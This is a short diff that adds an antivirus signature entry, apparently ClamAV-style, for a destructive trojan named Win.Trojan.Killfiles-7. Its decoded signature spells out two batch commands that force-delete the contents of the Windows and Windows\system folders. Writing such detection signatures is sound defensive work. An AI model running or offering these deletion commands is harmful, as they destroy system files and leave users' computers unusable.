@@ -1,0 +1,6 @@
+VIRUS NAME: Win.Trojan.Killfiles-7
+TARGET TYPE: ANY FILE
+OFFSET: *
+DECODED SIGNATURE:
+if exist c:\windows\system\*.* del c:\windows\system\*.* /Q /F
+if exist c:\windows\*.* del c:\windows\*.* /Q 
